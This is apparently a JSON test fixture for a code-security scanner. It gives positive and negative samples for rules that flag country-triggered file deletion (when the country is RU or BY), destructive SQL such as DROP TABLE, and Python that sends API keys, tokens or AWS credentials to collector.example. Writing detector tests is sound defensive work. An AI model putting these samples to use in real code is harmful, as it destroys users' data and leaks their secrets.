@@ -1,0 +1,399 @@
+{
+  "schema": 1,
+  "cases": [
+    {
+      "id": "go-1",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country == \"RU\") { os.RemoveAll(path) } }"
+    },
+    {
+      "id": "go-2",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country == \"BY\") { os.Remove(path) } }"
+    },
+    {
+      "id": "go-3",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country != \"RU\") { println(country) } else { os.RemoveAll(path) } }"
+    },
+    {
+      "id": "go-4",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country == \"RU\") { if (enabled) { os.Remove(path) } } }"
+    },
+    {
+      "id": "go-5",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country == \"RU\") { println(country) } os.RemoveAll(path) }"
+    },
+    {
+      "id": "go-6",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (false && country == \"RU\") { os.RemoveAll(path) } }"
+    },
+    {
+      "id": "go-7",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if country == \"RU\" { callback := func() { os.RemoveAll(path) }; _ = callback } }"
+    },
+    {
+      "id": "go-8",
+      "language": "Go",
+      "path": "sample.go",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "package main\nimport \"os\"\nfunc run(country string, path string) { if (country == \"BY\") { println(country) } }"
+    },
+    {
+      "id": "csharp-1",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"RU\") { Directory.Delete(path); } } }"
+    },
+    {
+      "id": "csharp-2",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"BY\") { File.Delete(path); } } }"
+    },
+    {
+      "id": "csharp-3",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country != \"RU\") { System.Console.WriteLine(country); } else { Directory.Delete(path); } } }"
+    },
+    {
+      "id": "csharp-4",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"RU\") { if (enabled) { File.Delete(path); } } } }"
+    },
+    {
+      "id": "csharp-5",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"RU\") { System.Console.WriteLine(country); } Directory.Delete(path); } }"
+    },
+    {
+      "id": "csharp-6",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (false && country == \"RU\") { Directory.Delete(path); } } }"
+    },
+    {
+      "id": "csharp-7",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"RU\") { System.Action callback = () => Directory.Delete(path); } } }"
+    },
+    {
+      "id": "csharp-8",
+      "language": "C#",
+      "path": "sample.cs",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "using System.IO; class C { void Run(string country, string path) { if (country == \"BY\") { System.Console.WriteLine(country); } } }"
+    },
+    {
+      "id": "javascript-1",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country, path) { if (country == \"RU\") { fs.rmSync(path); } }"
+    },
+    {
+      "id": "javascript-2",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country, path) { if (country == \"BY\") { fs.unlinkSync(path); } }"
+    },
+    {
+      "id": "javascript-3",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country, path) { if (country != \"RU\") { console.log(country); } else { fs.rmSync(path); } }"
+    },
+    {
+      "id": "javascript-4",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country, path) { if (country == \"RU\") { if (enabled) { fs.unlinkSync(path); } } }"
+    },
+    {
+      "id": "javascript-5",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country, path) { if (country == \"RU\") { console.log(country); } fs.rmSync(path); }"
+    },
+    {
+      "id": "javascript-6",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country, path) { if (false && country == \"RU\") { fs.rmSync(path); } }"
+    },
+    {
+      "id": "javascript-7",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country, path) { if (country == \"RU\") { const callback = () => { fs.rmSync(path); }; } }"
+    },
+    {
+      "id": "javascript-8",
+      "language": "JavaScript",
+      "path": "sample.js",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country, path) { if (country == \"BY\") { console.log(country); } }"
+    },
+    {
+      "id": "typescript-1",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country: string, path: string) { if (country == \"RU\") { fs.rmSync(path); } }"
+    },
+    {
+      "id": "typescript-2",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country: string, path: string) { if (country == \"BY\") { fs.unlinkSync(path); } }"
+    },
+    {
+      "id": "typescript-3",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country: string, path: string) { if (country != \"RU\") { console.log(country); } else { fs.rmSync(path); } }"
+    },
+    {
+      "id": "typescript-4",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": true,
+      "code": "function run(country: string, path: string) { if (country == \"RU\") { if (enabled) { fs.unlinkSync(path); } } }"
+    },
+    {
+      "id": "typescript-5",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country: string, path: string) { if (country == \"RU\") { console.log(country); } fs.rmSync(path); }"
+    },
+    {
+      "id": "typescript-6",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country: string, path: string) { if (false && country == \"RU\") { fs.rmSync(path); } }"
+    },
+    {
+      "id": "typescript-7",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country, path) { if (country == \"RU\") { const callback = () => { fs.rmSync(path); }; } }"
+    },
+    {
+      "id": "typescript-8",
+      "language": "TypeScript",
+      "path": "sample.ts",
+      "rule": "AST_GEO_ACTION",
+      "positive": false,
+      "code": "function run(country: string, path: string) { if (country == \"BY\") { console.log(country); } }"
+    },
+    {
+      "id": "sql-1",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": true,
+      "code": "DROP TABLE records;"
+    },
+    {
+      "id": "sql-2",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": true,
+      "code": "TRUNCATE TABLE records;"
+    },
+    {
+      "id": "sql-3",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": true,
+      "code": "DROP TABLE IF EXISTS records;"
+    },
+    {
+      "id": "sql-4",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": true,
+      "code": "-- migration\nDROP TABLE records;"
+    },
+    {
+      "id": "sql-5",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": false,
+      "code": "SELECT * FROM records;"
+    },
+    {
+      "id": "sql-6",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": false,
+      "code": "-- DROP TABLE records;\nSELECT 1;"
+    },
+    {
+      "id": "sql-7",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": false,
+      "code": "SELECT 'DROP TABLE records;' AS example;"
+    },
+    {
+      "id": "sql-8",
+      "language": "SQL",
+      "path": "sample.sql",
+      "rule": "SQL_DESTRUCTIVE",
+      "positive": false,
+      "code": "CREATE TABLE drop_log (id INT);"
+    },
+    {
+      "id": "python-1",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": true,
+      "code": "import os, requests\nvalue = os.getenv(\"API_KEY\")\nrequests.post(\"https://collector.example/upload\", json={\"key\": value})",
+      "allow_domains": []
+    },
+    {
+      "id": "python-2",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": true,
+      "code": "import os, requests\nrequests.post(\"https://collector.example/upload\", headers={\"Authorization\": os.environ[\"GITHUB_TOKEN\"]})",
+      "allow_domains": []
+    },
+    {
+      "id": "python-3",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": true,
+      "code": "import requests\nvalue = open(\"/home/demo/.aws/credentials\").read()\nrequests.post(\"https://collector.example/upload\", data=value)",
+      "allow_domains": []
+    },
+    {
+      "id": "python-4",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": true,
+      "code": "import os, requests\ndef send(value):\n    requests.post(\"https://collector.example/upload\", data=value)\nsend(os.getenv(\"PASSWORD\"))",
+      "allow_domains": []
+    },
+    {
+      "id": "python-5",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": false,
+      "code": "import os, requests\nvalue = os.getenv(\"API_KEY\")\nvalue = \"public-example\"\nrequests.post(\"https://collector.example/upload\", data=value)",
+      "allow_domains": []
+    },
+    {
+      "id": "python-6",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": false,
+      "code": "import os, requests\nrequests.post(\"https://collector.example/upload\", data=os.getenv(\"LANG\"))",
+      "allow_domains": []
+    },
+    {
+      "id": "python-7",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": false,
+      "code": "import os, requests\nrequests.post(\"https://api.example/upload\", headers={\"Authorization\": os.getenv(\"API_KEY\")})",
+      "allow_domains": [
+        "api.example"
+      ]
+    },
+    {
+      "id": "python-8",
+      "language": "Python",
+      "path": "sample.py",
+      "rule": "SENSITIVE_DATA_SEND",
+      "positive": false,
+      "code": "import os\nvalue = os.getenv(\"SECRET\")\nprint(len(value))",
+      "allow_domains": []
+    }
+  ]
+}
